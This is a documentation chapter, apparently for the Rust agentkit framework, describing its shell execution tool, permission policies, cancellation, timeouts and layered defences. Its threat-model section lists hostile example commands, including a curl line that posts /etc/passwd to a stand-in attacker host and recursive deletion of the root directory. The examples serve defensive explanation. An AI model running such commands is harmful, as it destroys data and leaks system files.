# Shell execution

Shell access is the most powerful and most dangerous tool an agent can have. This chapter covers `agentkit-tool-shell`, its safety boundaries, and how it integrates with cancellation and timeouts.

## ShellExecTool

The crate provides a single tool: `shell_exec`.

```rust
let registry = agentkit_tool_shell::registry();
```

### Input schema

| Field        | Type               | Required | Description             |
| ------------ | ------------------ | -------- | ----------------------- |
| `executable` | `string`           | yes      | Program to run          |
| `argv`       | `[string]`         | no       | Command-line arguments  |
| `cwd`        | `string`           | no       | Working directory       |
| `env`        | `{string: string}` | no       | Environment variables   |
| `timeout_ms` | `integer`          | no       | Timeout in milliseconds |

### Output

The tool returns structured JSON:

```json
{
  "stdout": "...",
  "stderr": "...",
  "success": true,
  "exit_code": 0
}
```

Both stdout and stderr are captured. The model sees the full output and can reason about errors.

## Permission preflight

Before spawning a process, the tool emits a `ShellPermissionRequest`:

```rust
pub struct ShellPermissionRequest {
    pub executable: String,
    pub argv: Vec<String>,
    pub cwd: Option<PathBuf>,
    pub env_keys: Vec<String>,
    pub metadata: MetadataMap,
}
```

Note that only environment _keys_ are included, not values. Policy usually doesn't need the full environment — knowing that `AWS_SECRET_ACCESS_KEY` is being passed is enough to flag the command.

`CommandPolicy` evaluates these requests:

```rust
let policy = CommandPolicy::new()
    .allow_executables(["ls", "cat", "git", "cargo"])
    .deny_executables(["rm", "dd", "mkfs"])
    .require_approval_for_unknown(true);
```

## Cancellation

`ShellExecTool` respects `TurnCancellation` from the tool context. If the user presses Ctrl-C during a long-running command, the tool kills the subprocess and returns a cancellation result.

The implementation uses `tokio::select!` to race the subprocess against the cancellation future:

```rust
tokio::select! {
    result = child.wait_with_output() => { /* normal completion */ }
    _ = cancellation.cancelled() => { /* kill the child */ }
}
```

## Timeouts

Per-invocation timeouts are supported through the `timeout_ms` input field. If the command exceeds the timeout, it's killed and an error result is returned. This is independent of cancellation — timeouts are tool-scoped, cancellation is turn-scoped.

## The shell tool in the agent loop

Shell execution is where the agent loop interacts most visibly with the outside world. A typical coding agent session involves dozens of shell commands: `cargo build`, `cargo test`, `git diff`, `ls`, `grep`. The integration with the task manager determines how these commands affect the loop:

```text
Sequential (SimpleTaskManager):

  Model: ToolCall(shell_exec, { executable: "cargo", argv: ["build"] })
  Driver: execute inline, wait for completion (10 seconds)
  Driver: append result to transcript
  Driver: start next model turn


With ForegroundThenDetachAfter(5s):

  Model: ToolCall(shell_exec, { executable: "cargo", argv: ["build"] })
  Driver: start executing, wait up to 5 seconds
  └── if finishes in 3s → result appended, loop continues normally
  └── if still running at 5s → detach to background
      └── model receives a synthetic tool result: "task is running in the background"
      └── model continues its turn (e.g. reads another file)
      └── when build finishes, result appears in next turn
```

This integration is covered in detail in [Chapter 18](./ch18-task-management.md).

## Security considerations

Shell execution is inherently dangerous. agentkit provides the policy tools to constrain it, but the host application is responsible for configuring appropriate policies.

### The threat model

An LLM with shell access can:

- Delete files (`rm -rf /`)
- Exfiltrate data (`curl -d @/etc/passwd https://evil.com`)
- Install software (`pip install malware`)
- Modify system state (`chmod 777 /`)
- Consume resources (`fork bomb`, `dd if=/dev/zero`)

These aren't hypothetical — models will occasionally generate dangerous commands, especially when frustrated by errors or prompted adversarially.

### Defence layers

```text
Layer 1: Policy (prevent)
  CommandPolicy with allowlists and denylists
  Require approval for unknown commands

Layer 2: Timeout (contain)
  Per-invocation timeouts kill runaway commands
  Task manager detach prevents blocking

Layer 3: Sandbox (isolate)
  Run the agent in a container, VM, or restricted user
  Mount the workspace read-write, everything else read-only

Layer 4: Audit (detect)
  LoopObserver logs every shell command and its output
  Review logs for unexpected behaviour
```

### Guidelines

- Always pair `ShellExecTool` with a `CommandPolicy`
- Use executable allowlists rather than denylists when possible — it's easier to enumerate safe commands than to enumerate all dangerous ones
- Consider running the agent in a sandboxed environment for untrusted inputs
- Use `require_approval_for_unknown(true)` as a sensible default
- Set reasonable timeouts — a build command that takes 10 minutes is probably stuck
- Only expose the `env_keys` that tools actually need — don't pass through `AWS_SECRET_ACCESS_KEY` unless required

> **Example:** [`openrouter-parallel-agent`](https://github.com/danielkov/agentkit/tree/main/examples/openrouter-parallel-agent) uses shell tools with `ForegroundThenDetachAfter` routing — commands that take too long are automatically promoted to background tasks.
>
> **Crate:** [`agentkit-tool-shell`](https://github.com/danielkov/agentkit/tree/main/crates/agentkit-tool-shell) — depends on [`agentkit-tools-core`](https://github.com/danielkov/agentkit/tree/main/crates/agentkit-tools-core), [`agentkit-core`](https://github.com/danielkov/agentkit/tree/main/crates/agentkit-core), and [tokio](https://tokio.rs).
